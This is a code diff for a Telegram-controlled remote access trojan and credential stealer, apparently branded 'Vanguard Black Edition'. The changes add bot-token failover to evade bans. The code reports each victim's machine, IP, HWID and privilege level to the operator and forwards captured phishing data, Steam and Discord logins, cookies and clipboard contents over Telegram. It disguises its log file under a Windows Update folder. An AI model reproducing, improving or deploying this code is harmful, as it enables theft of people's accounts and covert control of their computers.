@@ -27,22 +27,51 @@ namespace FinalBot
             if (val > 50000) Console.WriteLine("Hash:" + 76229);
         }
 
-        private readonly ITelegramBotClient _botClient;
+        private ITelegramBotClient _botClient;
         private readonly string _adminId;
         private readonly CommandHandler _commandHandler;
         private bool _isRunning = true;
+        private HttpClient? _httpClient;
+        private CancellationTokenSource _cts = new CancellationTokenSource();
 
         [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
         [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
         public BotOrchestrator(string token, string adminId, HttpClient? client = null)
         {
-            _botClient = new TelegramBotClient(token, client);
+            _httpClient = client;
             _adminId = adminId;
+            
+            // Initial initialization
+            _botClient = CreateClient(token, client);
             _commandHandler = new CommandHandler(_botClient, _adminId);
             TelegramService.Initialize(token, adminId, client);
 
             // NativeAOT Hint: preserve generic list of UpdateType
             GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
+        }
+
+        private ITelegramBotClient CreateClient(string token, HttpClient? client)
+        {
+            var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
+            if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/";
+            if (!baseUrl.EndsWith("/")) baseUrl += "/";
+
+            var options = new TelegramBotClientOptions(token, baseUrl);
+            return new TelegramBotClient(options, client);
+        }
+
+        public void ReinitializeBotClient()
+        {
+            // Trigger rotation in the static service
+            TelegramService.RotateToken();
+            string? newToken = TelegramService.CurrentToken;
+            
+            if (string.IsNullOrEmpty(newToken)) return;
+            
+            _botClient = CreateClient(newToken, _httpClient);
+            _commandHandler.UpdateBotClient(_botClient);
+            
+            Console.WriteLine("[ORCHESTRATOR] Bot client re-initialized with backup token.");
         }
 
         public async Task StartAsync()
@@ -53,49 +82,67 @@ namespace FinalBot
                 DebugLog("[ORCHESTRATOR] Starting services...");
                 
                 // --- ANTI-GFW MESH INITIALIZATION ---
-                // Find best route before anything else
                 _ = await TelegramService.FindBestRoute();
-                
-                // Handle Auto-Proxy Node registration if in Clean Region
                 _ = Task.Run(() => VanguardCore.Modules.ProxyModule.AutoRegisterAsync());
-
-                // Start Named Pipe listener for phishing reports (Steam/WeChat/Discord)
-                DebugLog("[ORCHESTRATOR] Launching Named Pipe listener...");
                 _ = Task.Run(() => StartPipeListener());
 
-                // 1. Initial Report (Async to prevent blocking)
-                DebugLog("[ORCHESTRATOR] Sending startup report...");
+                // Startup Report
                 _ = Task.Run(async () => {
                     try { await SendStartupReport(); } catch { }
                 });
 
                 Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");
 
-                var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
-                {
-                    AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
-                };
-
-                _botClient.StartReceiving(
-                    updateHandler: async (c, u, ct) => {
-                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [BOT] Update received: {u.Type}");
-                        await _commandHandler.HandleUpdateAsync(c, u, ct);
-                    },
-                    pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
-                    receiverOptions: receiverOptions,
-                    cancellationToken: default
-                );
-
-                // Keep alive loop
                 while (_isRunning)
                 {
-                    await Task.Delay(1000);
+                    using (var loopCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))
+                    {
+                        try 
+                        {
+                            var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions { AllowedUpdates = Array.Empty<UpdateType>() };
+                            
+                            _botClient.StartReceiving(
+                                updateHandler: async (c, u, ct) => {
+                                    Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [BOT] Update received: {u.Type}");
+                                    await _commandHandler.HandleUpdateAsync(c, u, ct);
+                                },
+                                pollingErrorHandler: async (c, ex, ct) => {
+                                    Console.WriteLine($"[POLLING ERROR] {ex.Message}");
+                                    
+                                    // If token is banned or unauthorized, rotate it!
+                                    if (ex.Message.Contains("401") || ex.Message.Contains("403") || ex.Message.Contains("Unauthorized"))
+                                    {
+                                        Console.WriteLine("[!] Token invalidated. Rotating to backup...");
+                                        ReinitializeBotClient();
+                                        loopCts.Cancel(); // Force polling loop restart
+                                    }
+                                    else {
+                                        await _commandHandler.HandlePollingErrorAsync(c, ex, ct);
+                                    }
+                                },
+                                receiverOptions: receiverOptions,
+                                cancellationToken: loopCts.Token
+                            );
+
+                            // Keep the loop alive while the token is valid
+                            while (!loopCts.IsCancellationRequested && _isRunning)
+                            {
+                                await Task.Delay(1000, loopCts.Token);
+                            }
+                        }
+                        catch (OperationCanceledException) { /* Failover triggered */ }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"[LOOP ERROR] {ex.Message}. Restarting...");
+                            await Task.Delay(3000);
+                        }
+                    }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[STARTUP ERROR] {ex.Message}\n{ex.StackTrace}");
-                DebugLog($"[{DateTime.Now}] [BOT ERROR] {ex}");
+                Console.WriteLine($"[CRITICAL ERROR] {ex.Message}");
+                DebugLog($"[ORCHESTRATOR ERROR] {ex}");
             }
         }
 
@@ -110,34 +157,21 @@ namespace FinalBot
                 bool isInjected = Environment.CommandLine.Contains("--injected");
                 string adminStatus = VanguardCore.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V6.11)" : "🟢 АДМИН") : "🟡 Обычный Юзер";
 
-                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
+                string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН (Vanguard Black Edition)</b>\n" +
                               $"━━━━━━━━━━━━━━━━━━\n" +
                               $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                               $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                               $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                               $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                               $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
-                              $"🎤 <b>Микрофон:</b> ✅\n" +
                               $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                               $"━━━━━━━━━━━━━━━━━━";
                 
                 string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
-
-                DebugLog($"[ORCHESTRATOR] Sending report to TG (ID: {pcUser})");
-                bool success = await TelegramService.SendMessage(info, adminPanelMarkup);
-                
-                if (success)
-                    DebugLog("[ORCHESTRATOR] Startup report SENT SUCCESSFULLY.");
-                else
-                    DebugLog("[ORCHESTRATOR] Startup report FAILED.");
+                await TelegramService.SendMessage(info, adminPanelMarkup);
             }
-            catch (Exception ex)
-            {
-                DebugLog($"[ORCHESTRATOR] Error in SendStartupReport: {ex.Message}");
-            }
+            catch { }
         }
-
-        private int _lastLogMessageId = 0;
 
         private async Task StartPipeListener()
         {
@@ -169,52 +203,11 @@ namespace FinalBot
                                     continue; 
                                 }
                             }
-
-                            if (decrypted.Contains("[Discord]") || decrypted.Contains("[PROGRESS]"))
-                            {
-                                int lastMsgId = CommandHandler.GetLastDiscordMessageId();
-                                if (lastMsgId != 0)
-                                {
-                                    try {
-                                        await _botClient.EditMessageTextAsync(_adminId, lastMsgId, decrypted, parseMode: ParseMode.Html);
-                                    } catch { }
-                                }
-                                else 
-                                {
-                                    var sent = await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html);
-                                    CommandHandler.SetLastDiscordMessageId(sent.MessageId);
-                                }
-                                continue;
-                            }
-
-                            if (decrypted.StartsWith("CLIPBOARD:"))
-                            {
-                                string content = decrypted.Substring(10).Trim();
-                                await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag($"📋 <b>CLIPBOARD CAPTURED</b>\n━━━━━━━━━━━━━━━━━━\n<code>{content}</code>"), parseMode: ParseMode.Html);
-                                continue;
-                            }
-
-                            bool isHighValue = decrypted.Contains("Captured") || decrypted.Contains("Steam") || decrypted.StartsWith("💎") || decrypted.StartsWith("🚨") || decrypted.StartsWith("✅") || decrypted.Contains("Login") || decrypted.Contains("Cookie");
-
-                            if (isHighValue)
-                            {
-                                try { 
-                                    await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html); 
-                                    
-                                    if (decrypted.Contains("Window Closed") && !Modules.PhishManager.GlobalBlockSteam)
-                                    {
-                                        Modules.PhishManager.StopLockdown();
-                                    }
-                                } catch { }
-                            }
+                            await _botClient.SendTextMessageAsync(_adminId, WrapWithSessionTag(decrypted), parseMode: ParseMode.Html);
                         }
                     }
                 }
-                catch (Exception ex) 
-                { 
-                    if (_isRunning) DebugLog($"[PIPE ERROR] {ex.Message}");
-                    await Task.Delay(100); 
-                }
+                catch { await Task.Delay(100); }
             }
         }
 
@@ -240,6 +233,6 @@ namespace FinalBot
             try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
         }
 
-        public void Stop() { _isRunning = false; }
+        public void Stop() { _isRunning = false; _cts.Cancel(); }
     }
 }
